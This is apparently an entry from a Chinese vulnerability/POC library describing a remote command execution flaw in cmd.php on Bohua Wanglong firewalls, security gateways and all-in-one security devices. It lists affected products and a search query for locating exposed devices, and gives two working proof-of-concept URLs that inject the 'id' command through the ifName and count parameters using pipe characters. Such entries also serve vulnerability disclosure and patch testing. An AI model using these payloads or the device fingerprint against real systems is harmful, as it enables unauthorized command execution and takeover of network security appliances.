---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# 博华网龙安全设备cmd.php远程命令执行漏洞

# 一、漏洞简介
中科博华是一家集科研、产品开发、技术服务、系统集成为一体的高科技企业，是国家商用密码产品定点生产单位，具有商用密码生产和销售许可证、3C认证、系统集成叁级资质、信息安全服务一级资质和涉密资质等。中科博华多个安全设备系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ 博华网龙防火墙
+ 博华网龙信息安全一体机
+ 博华网龙安全网关

# 三、资产测绘
+ hunter`web.title="博华网龙"`
+ 特征


# 四、漏洞复现
**poc1:**

```plain
/diagnostics/cmd.php?action=arping&ifName=|id||
```


**poc2:**

```plain
/diagnostics/cmd.php?action=ping&count=||id||
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ognnq9azp0fodi9b>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
